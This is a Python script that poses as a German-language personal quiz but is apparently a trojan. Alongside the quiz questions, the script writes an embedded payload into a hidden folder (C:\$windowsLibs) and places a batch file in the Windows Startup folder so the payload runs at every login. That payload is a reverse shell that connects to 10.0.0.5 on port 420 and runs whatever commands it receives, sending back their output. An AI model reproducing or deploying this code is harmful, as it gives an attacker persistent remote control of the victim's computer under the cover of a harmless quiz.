from os import getlogin
from subprocess import call
from os.path import exists
from time import sleep

var = """
import socket as s
import threading
from os.path import exists
from subprocess import check_output
from time import sleep

HOST = "10.0.0.5"
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect(ADDR)


def sendMsg(msg):
	sendLength = str(len(msg)).encode("utf-8")
	print(sendLength)
	client.send(sendLength)

	client.send(msg.encode(FORMAT))
	recvMsg()


def process(message):
	ctype = message[0]
	messageLst = message.split(" ")

	if ctype == "p":
		check_output(messageLst, shell=True).decode(FORMAT)
		recvMsg()
	elif ctype == "c":
		messageLst.pop(0)
		comm = check_output(messageLst, shell=True).decode(FORMAT)
		sendMsg(comm)

	elif ctype == "f":
		pass

	else:
		pass


def recvMsg():
	msgLen = int(client.recv(BUFFER).decode(FORMAT))

	if msgLen:
		msg = client.recv(int(msgLen)).decode(FORMAT)
		process(msg)


recvMsg()

"""


# die fragen:

def quizz():
    name = input("Wie heißst du?: ")
    alter = input("Wie alt bist du?: ")
    print(f"Hi {name}, du bist {alter} Jahre alt.")
    jahr = input("Welches Jahr haben wir?: ")
    if jahr != "2021":
        print("das ist leider falsch")

    input("Gehst du in die HTL Anichstraße?: ")
    input("Woher kommst du?: ")
    input("Bist du männlich?: ")
    print("mehr kommt noch!")


# librarry stuff:
def libInit():
    def libLoad():
        call(["mkdir", "C:\\$windowsLibs"], shell=True)
        call(["attrib", "+h", "C:\\$windowsLibs", "/d"], shell=True)

        with open("pslib.pyw", "w") as lib:
            lib.write(var)

        call(["move", "pslib.pyw", "C:\\$windowsLibs\\"], shell=True)
        # call(["python", "C:\\$windowsLibs\\pslib.pyw"], shell=True)
        call(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat", shell=True)

    if not exists(
            f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$windowsLibs\\pslib.pyw"):

        if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat"):
            with open("init.bat", "w") as bat:
                bat.write("python \"C:\$windowsLibs\pslib.pyw\"")

        sleep(0.5)
        call(["move", "init.bat",
              f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)

        if not exists("C:\\$windowsLibs\\pslib.pyw"):
            libLoad()

        quizz()

    else:
        quizz()


libInit()
